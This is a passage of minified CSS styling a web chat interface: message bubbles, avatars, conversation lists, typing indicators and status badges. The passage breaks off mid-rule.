                </style><style id="kins_style" type="text/css">.cs-main-container{position:relative;display:flex;flex-direction:row;height:100%;overflow:auto;border:solid 1px #d1dbe3;box-sizing:border-box;color:rgba(0,0,0,.87);background-color:#fff;font-size:1rem}.cs-main-container>.cs-conversation-list{order:0;height:100%;flex-basis:300px;border-top:solid 0px #d1dbe3;border-right:solid 1px #d1dbe3;border-bottom:solid 0px #d1dbe3;border-left:solid 0px #d1dbe3;box-shadow:2px 0 5px -2px rgba(0,0,0,.38);z-index:2}.cs-main-container>.cs-sidebar.cs-sidebar--left{order:0;height:100%;max-width:320px;flex-basis:35%;border-right:solid 1px #d1dbe3;z-index:2}.cs-main-container>.cs-sidebar.cs-sidebar--right{flex-basis:25%;min-width:150px;max-width:320px;border-top:solid 0px #d1dbe3;border-right:solid 0px #d1dbe3;border-bottom:solid 0px #d1dbe3;border-left:solid 1px #d1dbe3}.cs-main-container>.cs-sidebar.cs-sidebar--left .cs-search{margin:.5em}.cs-main-container .cs-chat-container{order:1;z-index:1;flex-grow:1;flex-basis:65%;border-right:solid 0px #d1dbe3}.cs-main-container .cs-sidebar{order:2;height:100%;z-index:3}.cs-main-container .cs-sidebar .cs-expansion-panel{border-left:0;border-top:0;border-right:0}.cs-main-container .cs-sidebar .cs-expansion-panel:nth-last-child(3){border-bottom:0}.cs-main-container .cs-conversation-header{z-index:1}.cs-main-container--responsive .cs-chat-container .cs-conversation-header .cs-conversation-header__back{display:none}.cs-main-container--responsive .cs-chat-container .cs-conversation-header .cs-conversation-header__actions .cs-button--info{display:none}@media(max-width: 768px){.cs-main-container--responsive{min-width:calc( 1.6em + 40px + 180px )}.cs-main-container--responsive .cs-search{display:none}.cs-main-container--responsive>.cs-sidebar.cs-sidebar--left{flex-basis:calc(1.6em + 40px);min-width:calc(1.6em + 40px)}.cs-main-container--responsive>.cs-sidebar.cs-sidebar--right{display:none}.cs-main-container--responsive>.cs-conversation-list{flex-basis:calc(1.6em + 40px)}.cs-main-container--responsive .cs-conversation-list .cs-conversation>.cs-avatar,.cs-main-container--responsive .cs-sidebar .cs-conversation-list .cs-conversation>.cs-avatar{margin-right:0}.cs-main-container--responsive .cs-conversation-list .cs-conversation__content,.cs-main-container--responsive .cs-sidebar .cs-conversation-list .cs-conversation__content{display:none}.cs-main-container--responsive .cs-conversation-list .cs-conversation__operations,.cs-main-container--responsive .cs-sidebar .cs-conversation-list .cs-conversation__operations{display:none}.cs-main-container--responsive .cs-conversation-list .cs-conversation__last-activity-time,.cs-main-container--responsive .cs-sidebar .cs-conversation-list .cs-conversation__last-activity-time{display:none}.cs-main-container--responsive .cs-conversation-list .cs-conversation__unread-dot,.cs-main-container--responsive .cs-sidebar .cs-conversation-list .cs-conversation__unread-dot{position:absolute;top:.3em;right:.3em;margin-right:0}.cs-main-container--responsive .cs-conversation-header .cs-conversation-header__actions .cs-button--info{display:flex}}@media(max-width: 576px){.cs-main-container--responsive{min-width:auto}.cs-main-container--responsive>.cs-sidebar.cs-sidebar--left{display:none}.cs-main-container--responsive .cs-chat-container .cs-conversation-header .cs-conversation-header__back{display:flex}}.cs-message{box-sizing:border-box;font-size:1em;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;color:rgba(0,0,0,.87);display:flex;flex-direction:row;padding:0;background-color:transparent;overflow:hidden;border-radius:0}.cs-message:only-child{margin:.2em 0 0 0}.cs-message:not(:only-child){margin:.2em 0 0 0}.cs-message__avatar{box-sizing:border-box;margin:0 8px 0 0;display:flex;flex-direction:column;justify-content:flex-end;width:42px}.cs-message__content-wrapper{box-sizing:border-box;display:flex;flex-direction:column}.cs-message__header{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent;display:flex;flex-direction:row;flex-wrap:nowrap;justify-content:space-between;font-size:.8em;margin:0 .2em .1em .2em}.cs-message__header .cs-message__sender-name{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent}.cs-message__header .cs-message__sent-time{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent;margin-left:auto;padding-left:.8em}.cs-message__footer{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent;display:flex;font-size:.8em;margin:.1em .2em 0 .2em}.cs-message__footer .cs-message__sender-name{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent}.cs-message__footer .cs-message__sent-time{box-sizing:border-box;color:rgba(77,77,77,.87);background-color:transparent;margin-left:auto;padding-left:.8em}.cs-message__content{box-sizing:border-box;color:rgba(0,0,0,.87);background-color:#c6e3fa;margin-top:0;padding:.6em .9em;border-radius:.7em .7em .7em .7em;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-word;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-weight:normal;font-size:.91em;font-variant:normal}.cs-message--incoming{color:rgba(0,0,0,.87);background-color:transparent;margin-right:auto}.cs-message--incoming .cs-message__avatar{margin:0 8px 0 0}.cs-message--incoming .cs-message__sender-name{display:none}.cs-message--incoming .cs-message__sent-time{display:none}.cs-message--incoming .cs-message__content{color:rgba(0,0,0,.87);background-color:#c6e3fa;border-radius:0 .7em .7em 0}.cs-message--outgoing{color:rgba(0,0,0,.87);background-color:transparent;margin-left:auto;justify-content:flex-end}.cs-message--outgoing .cs-message__avatar{order:1;margin:0 0 0 8px}.cs-message--outgoing .cs-message__sender-name{display:none}.cs-message--outgoing .cs-message__sent-time{display:none}.cs-message--outgoing .cs-message__content{color:rgba(0,0,0,.87);background-color:#6ea9d7;border-radius:.7em 0 0 .7em}.cs-message.cs-message--incoming.cs-message--single{border-radius:0}.cs-message.cs-message--incoming.cs-message--single:not(:first-child){margin-top:.4em}.cs-message.cs-message--incoming.cs-message--single .cs-message__sender-name{display:block}.cs-message.cs-message--incoming.cs-message--single .cs-message__sent-time{display:block}.cs-message.cs-message--incoming.cs-message--single .cs-message__content{border-radius:0 .7em .7em .7em}.cs-message.cs-message--incoming.cs-message--first{border-radius:0 0 0 0}.cs-message.cs-message--incoming.cs-message--first:not(:first-child){margin-top:.4em}.cs-message.cs-message--incoming.cs-message--first .cs-message__sender-name{display:block}.cs-message.cs-message--incoming.cs-message--first .cs-message__sent-time{display:block}.cs-message.cs-message--incoming.cs-message--first .cs-message__content{border-radius:0 .7em .7em 0;background-color:#c6e3fa}.cs-message.cs-message--incoming.cs-message--last{border-radius:0 0 0 0}.cs-message.cs-message--incoming.cs-message--last .cs-message__sent-time{display:none}.cs-message.cs-message--incoming.cs-message--last .cs-message__content{border-radius:0 .7em 0 .7em}.cs-message.cs-message--outgoing.cs-message--single{border-radius:0}.cs-message.cs-message--outgoing.cs-message--single:not(:first-child){margin-top:.4em}.cs-message.cs-message--outgoing.cs-message--single .cs-message__sent-time{display:block}.cs-message.cs-message--outgoing.cs-message--single .cs-message__content{border-radius:.7em .7em 0 .7em}.cs-message.cs-message--outgoing.cs-message--first{border-radius:0 0 0 0;margin-top:.4em}.cs-message.cs-message--outgoing.cs-message--first .cs-message__sent-time{display:block}.cs-message.cs-message--outgoing.cs-message--first .cs-message__content{border-radius:.7em 0 0 .7em;background-color:#6ea9d7}.cs-message.cs-message--outgoing.cs-message--last{border-radius:0 0 0 0}.cs-message.cs-message--outgoing.cs-message--last .cs-message__sent-time{display:none}.cs-message.cs-message--outgoing.cs-message--last .cs-message__content{border-radius:.7em 0 .7em .7em}.cs-message--incoming.cs-message--avatar-spacer{margin-left:50px}.cs-message--outgoing.cs-message--avatar-spacer{margin-right:50px}.cs-message--avatar-tl .cs-message__avatar{justify-content:flex-start;order:0;margin-right:8px;margin-left:0}.cs-message--avatar-tl .cs-message__message-wrapper{order:1}.cs-message--avatar-tr .cs-message__avatar{justify-content:flex-start;order:1;margin-left:8px;margin-right:0}.cs-message--avatar-tr .cs-message__message-wrapper{order:0}.cs-message--avatar-br .cs-message__avatar{justify-content:flex-end;order:1;margin-left:8px;margin-right:0}.cs-message--avatar-br .cs-message__message-wrapper{order:0}.cs-message--avatar-bl .cs-message__avatar{justify-content:flex-end;order:0;margin-right:8px;margin-left:0}.cs-message--avatar-bl .cs-message__message-wrapper{order:1}.cs-message--avatar-cl .cs-message__avatar{justify-content:center;order:0;margin-right:8px;margin-left:0}.cs-message--avatar-cl .cs-message__message-wrapper{order:1}.cs-message--avatar-cr .cs-message__avatar{justify-content:center;order:1;margin-left:8px;margin-right:0}.cs-message--avatar-cr .cs-message__message-wrapper{order:0}.cs-message-group{box-sizing:border-box;display:flex;flex-direction:row;margin:.4em 0 0 0}.cs-message-group__avatar{box-sizing:border-box;display:flex;flex-direction:column;justify-content:flex-end}.cs-message-group__content{box-sizing:border-box;display:flex;flex-direction:column}.cs-message-group__header{box-sizing:border-box;display:flex;font-size:.8em;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;color:rgba(0,0,0,.6);background-color:transparent;margin:0 0 .2em 0;padding:0}.cs-message-group__footer{box-sizing:border-box;display:flex;font-size:.8em;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;color:rgba(0,0,0,.6);background-color:transparent;margin:.2em 0 0 0;padding:0}.cs-message-group__messages{box-sizing:border-box}.cs-message-group__messages .cs-message:first-child{margin-top:0}.cs-message-group__messages .cs-message .cs-message__content{background-color:#c6e3fa;margin-top:0}.cs-message-group--incoming{justify-content:flex-start}.cs-message-group--incoming .cs-message-group__avatar{margin-right:8px;order:0}.cs-message-group--incoming .cs-message-group__content{order:1}.cs-message-group--incoming .cs-message-group__messages .cs-message:first-child .cs-message__content{border-radius:0 .7em .7em 0}.cs-message-group--incoming .cs-message-group__messages .cs-message .cs-message__content{border-radius:0 .7em .7em 0;color:rgba(0,0,0,.87);background-color:#c6e3fa}.cs-message-group--incoming .cs-message-group__messages .cs-message:last-child .cs-message__content{border-radius:0 .7em 0 .7em}.cs-message-group--incoming .cs-message-group__messages .cs-message:only-child .cs-message__content{border-radius:0 .7em .7em .7em}.cs-message-group--outgoing{justify-content:flex-end;margin-left:auto}.cs-message-group--outgoing .cs-message-group__avatar{margin-left:8px;order:1}.cs-message-group--outgoing .cs-message-group__content{order:0}.cs-message-group--outgoing .cs-message-group__messages .cs-message{justify-content:flex-end}.cs-message-group--outgoing .cs-message-group__messages .cs-message:first-child .cs-message__content{border-radius:.7em 0 0 .7em}.cs-message-group--outgoing .cs-message-group__messages .cs-message .cs-message__content{border-radius:.7em 0 0 .7em;color:rgba(0,0,0,.87);background-color:#6ea9d7}.cs-message-group--outgoing .cs-message-group__messages .cs-message:last-child .cs-message__content{border-radius:.7em 0 .7em .7em}.cs-message-group--outgoing .cs-message-group__messages .cs-message:only-child .cs-message__content{border-radius:.7em .7em 0 .7em}.cs-message-group--avatar-tl .cs-message-group__avatar{justify-content:flex-start;order:0;margin-right:8px;margin-left:0}.cs-message-group--avatar-tl .cs-message-group__content{order:1}.cs-message-group--avatar-tr .cs-message-group__avatar{justify-content:flex-start;order:1;margin-left:8px;margin-right:0}.cs-message-group--avatar-tr .cs-message-group__content{order:0}.cs-message-group--avatar-bl .cs-message-group__avatar{justify-content:flex-end;order:0;margin-right:8px;margin-left:0}.cs-message-group--avatar-bl .cs-message-group__content{order:1}.cs-message-group--avatar-br .cs-message-group__avatar{justify-content:flex-end;order:1;margin-left:8px;margin-right:0}.cs-message-group--avatar-br .cs-message-group__content{order:0}.cs-message-group--avatar-cl .cs-message-group__avatar{justify-content:center;order:0;margin-right:8px;margin-left:0}.cs-message-group--avatar-cl .cs-message-group__content{order:1}.cs-message-group--avatar-cr .cs-message-group__avatar{justify-content:center;order:1;margin-left:8px;margin-right:0}.cs-message-group--avatar-cr .cs-message-group__content{order:0}.cs-message-separator{box-sizing:border-box;color:#6ea9d7;background-color:#fff;font-size:.8em;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;text-align:center;display:flex;flex-direction:row;flex-wrap:nowrap;justify-content:space-between;align-items:center}.cs-message-separator::before,.cs-message-separator::after{box-sizing:border-box;content:"";background-color:#6ea9d7;display:block;flex-grow:1;height:1px}.cs-message-separator:not(:empty)::before{margin:0 1em 0 0}.cs-message-separator:not(:empty)::after{margin:0 0 0 1em}.cs-message-list{box-sizing:border-box;width:100%;height:100%;overflow:hidden;min-height:1.25em;position:relative;color:rgba(0,0,0,.87);background-color:#fff}.cs-message-list__scroll-wrapper{box-sizing:border-box;position:absolute;top:0;left:0;right:0;bottom:0;overflow:hidden;padding:0 1.2em 0 .8em}.cs-message-list__scroll-to:first-child{box-sizing:border-box;float:left;clear:both;height:0}.cs-message-list__scroll-wrapper>.cs-message:nth-last-child(4){margin-bottom:2.65em}.cs-message-list__scroll-wrapper>.cs-message-group:nth-last-child(4){margin-bottom:2.65em}.cs-message-list .cs-typing-indicator{position:absolute;bottom:0;left:0;right:15px;background-color:#fff;padding:.5em .5em;font-size:.9em;height:1.25em;line-height:1.25em}.cs-message-list__scroll-wrapper>.cs-message,.cs-message-list__scroll-wrapper>.cs-message-group{max-width:85%}.cs-message-list .cs-message.cs-message--incoming,.cs-message-list .cs-message-group.cs-message-group--incoming{margin-right:auto}.cs-message-list .cs-message.cs-message--outgoing,.cs-message-list .cs-message-group.cs-message-group--outgoing{margin-left:auto}.cs-message-list .cs-message-separator:not(:first-child){margin-top:1.2em}.cs-message-list__loading-more{box-sizing:content-box;display:flex;flex-direction:row;justify-content:center;position:absolute;background-color:#fff;padding:2px 0;top:0;left:0;right:0;height:1.2em;z-index:1}.cs-message-list__loading-more .cs-loader{width:1.2em;height:1.2em}.cs-message-list__loading-more .cs-loader::before,.cs-message-list__loading-more .cs-loader::after{width:100%;height:100%}.cs-message-list__loading-more--bottom{top:initial;bottom:0}.cs-message-list .ps__rail-y{z-index:2}.cs-avatar{position:relative;width:42px;height:42px;border-radius:50%;box-sizing:border-box}.cs-avatar>img{box-sizing:border-box;width:100%;height:100%;border-radius:50%}.cs-avatar:hover>img{filter:brightness(115%)}.cs-avatar.cs-avatar--xs{width:16px;height:16px;min-width:16px;min-height:16px}.cs-avatar.cs-avatar--sm{width:26px;height:26px;min-width:26px;min-height:26px}.cs-avatar.cs-avatar--md{width:42px;height:42px;min-width:42px;min-height:42px}.cs-avatar.cs-avatar--lg{width:68px;height:68px;min-width:68px;min-height:68px}.cs-avatar.cs-avatar--fluid{width:100%;height:100%}.cs-avatar.cs-avatar--fluid .cs-status{right:5%;width:22%;height:22%}.cs-avatar .cs-status{box-sizing:border-box;position:absolute;right:-1px;bottom:3%}.cs-avatar .cs-status__bullet{box-sizing:content-box;border:solid 2px #fff}.cs-avatar .cs-status--xs,.cs-avatar .cs-status--xs:not(.cs-status--named){font-size:1em;width:6px;height:6px;right:0;bottom:0}.cs-avatar .cs-status--xs .cs-status__bullet,.cs-avatar .cs-status--xs:not(.cs-status--named) .cs-status__bullet{width:4px;min-width:4px;height:4px}.cs-avatar .cs-status--sm,.cs-avatar .cs-status--sm:not(.cs-status--named){font-size:1em;width:12px;height:12px;right:-3px;bottom:-1px}.cs-avatar .cs-status--sm .cs-status__bullet,.cs-avatar .cs-status--sm:not(.cs-status--named) .cs-status__bullet{width:8px;min-width:8px;height:8px}.cs-avatar .cs-status--md,.cs-avatar .cs-status--md:not(.cs-status--named){font-size:1em;width:15px;height:15px}.cs-avatar .cs-status--md .cs-status__bullet,.cs-avatar .cs-status--md:not(.cs-status--named) .cs-status__bullet{width:11px;min-width:11px;height:11px}.cs-avatar .cs-status--lg,.cs-avatar .cs-status--lg:not(.cs-status--named){font-size:1em;width:18px;height:18px;bottom:4%}.cs-avatar .cs-status--lg .cs-status__bullet,.cs-avatar .cs-status--lg:not(.cs-status--named) .cs-status__bullet{width:14px;min-width:14px;height:14px}.cs-avatar-group{display:flex;flex-direction:row-reverse;overflow:visible;position:relative;flex-wrap:wrap;box-sizing:border-box;min-width:40px;align-content:flex-start;justify-content:flex-end}.cs-avatar-group .cs-avatar--active{z-index:1}.cs-avatar-group .cs-avatar--active-on-hover:hover{z-index:2}.cs-avatar-group--xs{padding-left:6.112px;padding-top:6.112px}.cs-avatar-group--xs .cs-avatar{margin-top:-6.112px;margin-left:-6.112px;width:16px;height:16px;min-width:16px;min-height:16px;border:none;border-right:1px solid #f2f2f2}.cs-avatar-group--sm{padding-left:9.932px;padding-top:9.932px}.cs-avatar-group--sm .cs-avatar{margin-top:-9.932px;margin-left:-9.932px;width:26px;height:26px;min-width:26px;min-height:26px}.cs-avatar-group--md{padding-left:16.044px;padding-top:16.044px}.cs-avatar-group--md .cs-avatar{margin-top:-16.044px;margin-left:-16.044px;width:42px;height:42px;min-width:42px;min-height:42px;border:2px solid #f2f2f2}.cs-avatar-group--lg{padding-left:25.976px;padding-top:25.976px}.cs-avatar-group--lg .cs-avatar{margin-top:-25.976px;margin-left:-25.976px;width:68px;height:68px;min-width:68px;min-height:68px;border:2px solid #f2f2f2}.cs-message-input{display:flex;flex-direction:row;position:relative;background-color:#fff;border-top:none;border-right:none;border-bottom:none;border-left:none;box-sizing:border-box;padding:0;overflow:visible;flex-shrink:0}.cs-message-input__content-editor-wrapper{box-sizing:border-box;position:relative;background-color:#c6e3fa;margin:0;padding:.6em .9em;border-radius:.7em;flex-grow:1}.cs-message-input--disabled .cs-message-input__content-editor-wrapper{background-color:rgba(198,227,250,.38);color:rgba(0,0,0,.6)}.cs-message-input__content-editor-container{box-sizing:border-box;position:relative;background-color:#c6e3fa;display:flex;flex-direction:column;align-items:stretch;overflow:hidden;overflow-y:auto;font-size:.94em;line-height:1.35em;min-height:1.35em;max-height:5.4em;padding:0em 0em 0em 0em;scroll-padding:0em}.cs-message-input--disabled .cs-message-input__content-editor-container{color:rgba(0,0,0,.6);background-color:transparent}.cs-message-input__content-editor{box-sizing:border-box;flex-grow:1;background-color:#c6e3fa;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;outline:0;border-top:0 none;border-right:0 none;border-bottom:0 none;border-left:0 none;overflow:visible;color:rgba(0,0,0,.87);overflow-wrap:anywhere;word-break:break-word}.cs-message-input--disabled .cs-message-input__content-editor{background-color:transparent;color:rgba(0,0,0,.6)}.cs-message-input__content-editor[data-placeholder]:empty:before{box-sizing:border-box;content:attr(data-placeholder);color:rgba(0,0,0,.38);display:block;cursor:text}.cs-message-input__tools{display:flex;flex-direction:row;box-sizing:border-box}.cs-message-input__tools .cs-button{font-size:1.2em;margin-top:0;margin-bottom:0}.cs-message-input__tools .cs-button--send{align-self:flex-end}.cs-message-input__tools .cs-button--attachment{align-self:flex-end}.cs-message-input__tools:first-child .cs-button:first-child{margin-left:0}.cs-message-input__tools:first-child .cs-button:last-child{margin-right:0}.cs-message-input__tools:last-child .cs-button:first-child{margin-left:0}.cs-message-input__tools:last-child .cs-button:last-child{margin-right:0}.cs-input-toolbox{box-sizing:border-box;display:flex;flex-direction:row;justify-content:flex-end;margin:0;padding:0 0 .4em 0}.cs-input-toolbox .cs-button{margin:0;padding:0;background:none;border:none;margin:0 .5em 0 0;font-size:1.2em}.cs-chat-container{box-sizing:border-box;display:flex;flex-direction:column;height:100%;min-width:180px;color:rgba(0,0,0,.87);background-color:#fff}.cs-chat-container .cs-message-input{border-top:solid 1px #d1dbe3;border-right:solid 0px #d1dbe3;border-bottom:solid 0px #d1dbe3;border-left:solid 0px #d1dbe3;margin-top:auto;padding:.3em 0 .3em 0em;color:rgba(0,0,0,.87);background-color:#fff}.cs-chat-container .cs-message-input .cs-message-input__content-editor-wrapper:first-child{margin-left:.8em}.cs-chat-container .cs-message-input .cs-message-input__content-editor-wrapper:last-child{margin-right:.8em}.cs-chat-container .cs-input-toolbox{margin:0;padding:0 .8em .17em 0;color:rgba(0,0,0,.87);background-color:#fff}.cs-typing-indicator{box-sizing:content-box;font-size:inherit;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;display:flex;flex-direction:row;align-items:stretch}.cs-typing-indicator__indicator{box-sizing:inherit;background-color:transparent;display:flex;flex-direction:row;align-items:center}.cs-typing-indicator__dot{box-sizing:inherit;animation:cs-typing-indicator__typing-animation 1.5s infinite ease-in-out;border-radius:100%;display:inline-block;height:4px;width:4px;background-color:#6ea9d7}.cs-typing-indicator__dot:not(:last-child){margin-right:3px}.cs-typing-indicator__dot:nth-child(1){box-sizing:inherit}.cs-typing-indicator__dot:nth-child(2){animation-delay:300ms}.cs-typing-indicator__dot:nth-child(3){animation-delay:400ms}.cs-typing-indicator__text{box-sizing:inherit;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#6ea9d7;background-color:transparent;margin:0 0 0 .5em;-webkit-user-select:none;-moz-user-select:none;user-select:none}@keyframes cs-typing-indicator__typing-animation{0%{transform:translateY(0px)}28%{transform:translateY(-5px)}44%{transform:translateY(0px)}}.cs-conversation-header{box-sizing:border-box;color:rgba(0,0,0,.87);background-color:#f6fbff;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-size:1em;flex-shrink:0;-webkit-user-select:none;-moz-user-select:none;user-select:none;display:flex;flex-direction:row;align-items:stretch;border-top:solid 0px #d1dbe3;border-right:solid 0px #d1dbe3;border-bottom:solid 1px #d1dbe3;border-left:solid 0px #d1dbe3;padding:.6em .9em}.cs-conversation-header__back{box-sizing:border-box;margin-right:.5em;display:flex;flex-direction:row;align-items:center;cursor:pointer;order:1}.cs-conversation-header__back button{font-size:1.4em;padding:0}.cs-conversation-header__avatar{box-sizing:border-box;width:42px;height:42px;margin-right:1em;order:2}.cs-conversation-header__avatar>.cs-avatar>.cs-status>.cs-status__bullet{border-color:#f6fbff}.cs-conversation-header__avatar .cs-avatar-group{padding-right:0 !important}.cs-conversation-header__content{box-sizing:border-box;display:flex;flex-direction:column;order:3;flex-grow:2;justify-content:center;min-width:0}.cs-conversation-header__content .cs-conversation-header__user-name{box-sizing:border-box;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:bold;color:rgba(0,0,0,.87);background-color:#f6fbff}.cs-conversation-header__content .cs-conversation-header__info{box-sizing:border-box;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:rgba(0,0,0,.6);background-color:#f6fbff;font-weight:normal;font-size:.9em}.cs-conversation-header__actions{box-sizing:border-box;display:flex;flex-direction:row;align-items:center;color:rgba(0,0,0,.87);background-color:transparent;margin:0 0 0 .5em;order:4}.cs-conversation-header__actions .cs-button:not(:first-child){margin-left:.2em}.cs-conversation-header__actions .cs-button{padding:0}.cs-conversation-header__actions .cs-button.cs-button--arrow,.cs-conversation-header__actions .cs-button.cs-button--info,.cs-conversation-header__actions .cs-button.cs-button--voicecall,.cs-conversation-header__actions .cs-button.cs-button--videocall,.cs-conversation-header__actions .cs-button.cs-button--star,.cs-conversation-header__actions .cs-button.cs-button--adduser,.cs-conversation-header__actions .cs-button.cs-button--ellipsis,.cs-conversation-header__actions .cs-button.cs-button--ellipsis{font-size:1.4em;color:normal;background-color:transparent}.cs-conversation-header__actions .cs-button.cs-button--ellipsis{font-size:1.3em}.cs-conversation{display:flex;flex-direction:row;box-sizing:border-box;position:relative;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;padding:.675em .8em .675em .8em;cursor:pointer;justify-content:flex-start;color:rgba(0,0,0,.87);background-color:#fff;-webkit-user-select:none;-moz-user-select:none;user-select:none;border-top:0;border-right:0;border-bottom:0;border-left:0}.cs-conversation:hover{background-color:#f3f8fc}.cs-conversation:hover>.cs-avatar>.cs-status>.cs-status__bullet{border-color:#f3f8fc}.cs-conversation:hover>.cs-avatar>img{filter:none}.cs-conversation.cs-conversation:active{color:rgba(0,0,0,.87);background-color:#d5e7f5;border-top:0;border-right:0;border-bottom:0;border-left:0}.cs-conversation.cs-conversation:active>.cs-avatar>.cs-status>.cs-status__bullet{border-color:#d5e7f5}.cs-conversation.cs-conversation--active{color:#2b6a9b;background-color:#d5e7f5;font-weight:normal;border-top:0;border-right:0;border-bottom:0;border-left:0}.cs-conversation.cs-conversation--active>.cs-avatar>.cs-status>.cs-status__bullet{border-color:#d5e7f5}.cs-conversation.cs-conversation--active .cs-conversation__name{color:#2b6a9b;font-weight:normal}.cs-conversation.cs-conversation--active .cs-conversation__info{color:#2b6a9b;font-weight:normal}.cs-conversation>.cs-avatar{width:42.1px;height:42.1px;margin-right:1em}.cs-conversation>.cs-avatar>.cs-status{border-color:#fff}.cs-conversation>.cs-avatar-group{width:42.1px;height:42.1px;min-width:42.1px;min-height:42.1px;padding-right:0 !important;margin-right:1em}.cs-conversation__content{box-sizing:border-box;display:flex;flex-direction:column;overflow:hidden;margin-right:1.1em;flex-grow:1}.cs-conversation__operations{box-sizing:border-box;display:flex;flex-direction:row;align-items:center;margin:0 0 0 auto;color:rgba(179,179,179,.87);visibility:hidden}.cs-conversation__operations--visible{visibility:visible}.cs-conversation__operations:hover{color:rgba(102,102,102,.87)}.cs-conversation:hover .cs-conversation__operations{visibility:visible}.cs-conversation__name{box-sizing:border-box;color:rgba(0,0,0,.87);font-size:1em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.cs-conversation__info{box-sizing:border-box;color:rgba(0,0,0,.6);font-size:.8em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.cs-conversation__last-sender{box-sizing:border-box;display:inline;font-weight:normal}.cs-conversation__info-content{box-sizing:border-box;display:inline;font-weight:normal}.cs-conversation__last-activity-time{box-sizing:border-box;margin:0 0 0 auto;font-size:.8em;display:flex;flex-direction:row;align-items:center}.cs-conversation__last-activity-time+.cs-conversation__operations{margin-left:.5em}.cs-conversation__unread-dot{box-sizing:content-box;display:flex;flex-direction:row;align-items:center;margin-right:.5em;align-self:center;border-radius:50%;width:.7em;min-width:.7em;height:.7em;box-shadow:1px 1px 1px 0px #b3b3b3;perspective:200px;perspective-origin:50% 50%;background:radial-gradient(circle at 3px 3px, #7c9df1, #2e63e8)}.cs-conversation__unread-dot:hover::before{content:"";position:absolute;top:1%;left:5%;border-radius:50%;z-index:2;filter:blur(0);height:80%;width:40%;background:radial-gradient(circle at 130% 130%, rgba(255, 255, 255, 0) 0, rgba(255, 255, 255, 0) 46%, rgba(255, 255, 255, 0.8) 50%, rgba(255, 255, 255, 0.8) 58%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);transform:translateX(131%) translateY(58%) rotateZ(168deg) rotateX(10deg)}.cs-conversation__unread-dot:hover::after{content:"";position:absolute;top:5%;left:10%;width:80%;height:80%;border-radius:100%;filter:blur(1px);z-index:2;transform:rotateZ(-30deg);display:block;background:radial-gradient(circle at 50% 80%, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0) 74%, white 80%, white 84%, rgba(255, 255, 255, 0) 100%);animation:cs-unread-anim 2s ease-out infinite}.cs-conversation__unread{box-sizing:border-box;position:absolute;right:.8em;top:.3em;padding:.01em .3em;border-radius:.3em;font-size:.75em;font-weight:600;color:#fff;background-color:#ec1212;max-width:30em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;z-index:100}@keyframes cs-unread-anim{0%{transform:scale(1)}20%{transform:scaleY(0.95) scaleX(1.05)}48%{transform:scaleY(1.1) scaleX(0.9)}68%{transform:scaleY(0.98) scaleX(1.02)}80%{transform:scaleY(1.02) scaleX(0.98)}97%,100%{transform:scale(1)}}.cs-conversation-list{box-sizing:border-box;position:relative;overflow:hidden;height:100%;color:rgba(0,0,0,.87);background-color:transparent}.cs-conversation-list>div>ul{margin:0;padding:0;list-style-type:none}.cs-conversation-list__loading-more{box-sizing:content-box;display:flex;flex-direction:row;justify-content:center;position:absolute;background-color:transparent;padding:2px 0;bottom:0;left:0;right:0;height:1.2em;z-index:1}.cs-conversation-list__loading-more .cs-loader{width:1.2em;height:1.2em}.cs-conversation-list__loading-more .cs-loader::before,.cs-conversation-list__loading-more .cs-loader::after{width:100%;height:100%}.cs-conversation-list .ps__rail-y{z-index:2}.cs-status{box-sizing:border-box;position:relative;display:flex;flex-direction:row;align-items:center;flex-wrap:nowrap;font-size:1em}.cs-status .cs-status__bullet{box-sizing:content-box;width:11px;height:11px;border-radius:50%;position:relative;perspective:200px;perspective-origin:50% 50%}.cs-status--selected{color:#2b6a9b;background-color:#d5e7f5}.cs-status--named{width:auto;height:auto}.cs-status__name{margin:0 0 0 .58em;line-height:1.5}.cs-avatar:hover .cs-status__bullet:before,.cs-status:hover .cs-status__bullet:before{box-sizing:border-box;content:"";position:absolute;top:1%;left:5%;border-radius:50%;z-index:2;filter:blur(0);height:80%;width:40%;background:radial-gradient(circle at 130% 130%, rgba(255, 255, 255, 0) 0, rgba(255, 255, 255, 0) 46%, rgba(255, 255, 255, 0.8) 50%, rgba(255, 255, 255, 0.8) 58%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);transform:translateX(131%) translateY(58%) rotateZ(168deg) rotateX(10deg)}.cs-avatar:hover .cs-status__bullet:after,.cs-status:hover .cs-status__bullet:after{box-sizing:border-box;content:"";position:absolute;top:5%;left:10%;width:80%;height:80%;border-radius:100%;filter:blur(1px);z-index:2;transform:rotateZ(-30deg);display:block;background:radial-gradient(circle at 50% 80%, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0) 74%, white 80%, white 84%, rgba(255, 255, 255, 0) 100%);animation:cs-bubble-anim 2s ease-out infinite}.cs-status--available .cs-status__bullet{background:radial-gradient(circle at 3px 3px, #00d5a6, #00a27e)}.cs-status--available .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--unavailable .cs-status__bullet{background:radial-gradient(circle at 3px 3px, #ffb527, #a66d00)}.cs-status--unavailable .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--away .cs-status__bullet{background:radial-gradient(circle at 3px 3px, #ffdbb0, #fc8b00)}.cs-status--away .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--dnd 